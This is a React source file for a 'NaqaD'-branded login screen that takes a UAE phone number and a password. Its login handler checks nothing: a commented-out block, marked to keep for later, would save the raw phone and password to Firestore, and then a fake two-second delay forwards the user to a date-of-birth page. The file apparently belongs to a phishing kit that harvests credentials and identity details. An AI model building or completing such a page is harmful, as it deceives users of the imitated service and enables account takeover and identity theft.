import React, { useState } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Eye, EyeOff } from "lucide-react";
import { useNavigate } from "react-router-dom";
import Logo from "@/assets/logo.png";
import Whatsapp from "@/assets/whatsapp.jpg";
import Flag from "@/assets/uae.svg";
// import { uploadData } from "@/firebase/FirebaseUtils"; // 🔥 keep for later

export default function Login() {
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleLogin = async () => {
    setLoading(true);

    // 🔥 Firestore upload (disabled for now)
    /*
    try {
      await uploadData({ phone, password });
    } catch (error) {
      console.error("Error saving login data:", error);
    }
    */

    setTimeout(() => {
      setLoading(false);
      navigate("/dob");
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col justify-between px-6 pt-10 pb-6">
      {/* Header */}
      <div className="w-full flex items-center justify-center relative">
        <div className="flex items-center gap-2">
          <img src={Logo} alt="Logo" className="w-10 h-10" />
          <span className="text-2xl font-bold">NaqaD</span>
        </div>
        <button className="absolute right-0">
          <img src={Whatsapp} alt="Whatsapp" className="w-8 h-8 rounded-full" />
        </button>
      </div>

      {/* Main content */}
      <div className="w-full flex flex-col mt-10 flex-1">
        <h1 className="text-xl font-semibold">Welcome Back!</h1>
        <p className="text-sm text-gray-500">Enter your credentials</p>

        {/* Phone number */}
        <div className="w-full mt-6">
          <label className="block text-sm text-gray-700 mb-2">Phone number</label>
          <div className="flex items-center border rounded-lg px-3 py-2">
            <img src={Flag} alt="UAE" className="w-6 h-6" />
            <span className="ml-2 mr-2">+971</span>
            <Input
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="border-0 focus:outline-none focus:ring-0 flex-1 p-0"
            />
          </div>
        </div>

        {/* Password */}
        <div className="w-full mt-6">
          <label className="block text-sm text-gray-700 mb-2">Password</label>
          <div className="relative">
            <Input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter your Password"
              className="pr-10 focus:outline-none focus:ring-0"
            />
            <button
              type="button"
              onClick={() => setShowPassword((s) => !s)}
              className="absolute right-2 top-1/2 -translate-y-1/2"
            >
              {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
            </button>
          </div>
        </div>
      </div>

      {/* Bottom button (fixed position without scroll) */}
      <div className="w-full mt-6">
        <Button
          onClick={handleLogin}
          disabled={loading}
          className="w-full bg-blue-900 hover:bg-blue-800 py-4 rounded-lg"
        >
          {loading ? "Loading..." : "Login"}
        </Button>
      </div>
    </div>
  );
}
